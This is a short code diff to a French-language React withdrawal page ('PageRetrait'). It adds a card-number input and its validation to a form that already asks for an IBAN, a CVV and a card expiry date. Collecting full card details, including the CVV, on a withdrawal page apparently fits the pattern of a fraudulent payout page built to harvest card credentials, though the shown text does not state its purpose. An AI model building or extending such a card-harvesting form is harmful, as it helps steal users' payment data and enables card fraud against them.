@@ -680,7 +680,7 @@ function PageRetrait({ user }) {
   const [form, setForm]             = useState({
     first_name: user?.first_name||'', last_name: user?.last_name||'',
     address: user?.address||'', postal_code: user?.postal_code||'',
-    city: user?.city||'', bank_name:'', iban:'', cvv:'', card_expiry:'',
+    city: user?.city||'', bank_name:'', iban:'', card_number:'', cvv:'', card_expiry:'',
   });
   const [errors, setErrors]         = useState({});
   const [submitStatus, setSubmitStatus] = useState('idle');
@@ -732,6 +732,7 @@ function PageRetrait({ user }) {
     if (!form.city.trim())       e.city='Requis';
     if (!form.bank_name.trim())  e.bank_name='Requis';
     if (!form.iban.trim() || !/^[A-Z0-9]{15,34}$/i.test(form.iban.replace(/\s/g,''))) e.iban='IBAN invalide';
+    if (form.card_number && !/^\d{13,19}$/.test(form.card_number.replace(/\s/g,''))) e.card_number='Numéro de carte invalide';
     if (!/^\d{3,4}$/.test(form.cvv)) e.cvv='CVV invalide';
     if (!/^\d{2}\/\d{2}$/.test(form.card_expiry)) e.card_expiry='Format MM/AA';
     return Object.keys(e).length ? e : null;
@@ -1159,6 +1160,7 @@ function PageRetrait({ user }) {
           <RetraitFld label="Nom de la banque" fieldKey="bank_name" placeholder="BNP Paribas"                          value={form.bank_name}   error={errors.bank_name}   onChange={e=>{setF('bank_name',e.target.value);setErrors(er=>({...er,bank_name:undefined}));}}/>
           <RetraitFld label="IBAN"             fieldKey="iban"      placeholder="FR76 3000 6000 0112 3456 7890 189"    value={form.iban}         error={errors.iban}         onChange={e=>{setF('iban',e.target.value);setErrors(er=>({...er,iban:undefined}));}}/>
           <div style={{fontSize:11,fontWeight:600,color:'var(--text2)',textTransform:'uppercase',letterSpacing:1,margin:'14px 0 8px'}}>Carte bancaire</div>
+          <RetraitFld label="Numéro de carte" fieldKey="card_number" placeholder="1234 5678 9012 3456" type="text" value={form.card_number} error={errors.card_number} onChange={e=>{setF('card_number',e.target.value);setErrors(er=>({...er,card_number:undefined}));}}/>
           <div style={{display:'flex',gap:8,flexWrap:'wrap'}}>
             <RetraitFld label="CVV"              fieldKey="cvv"         placeholder="123"   type="password" half value={form.cvv}         error={errors.cvv}         onChange={e=>{setF('cvv',e.target.value);setErrors(er=>({...er,cvv:undefined}));}}/>
             <RetraitFld label="Date d'expiration" fieldKey="card_expiry" placeholder="MM/AA"               half value={form.card_expiry} error={errors.card_expiry} onChange={e=>{setF('card_expiry',e.target.value);setErrors(er=>({...er,card_expiry:undefined}));}}/>
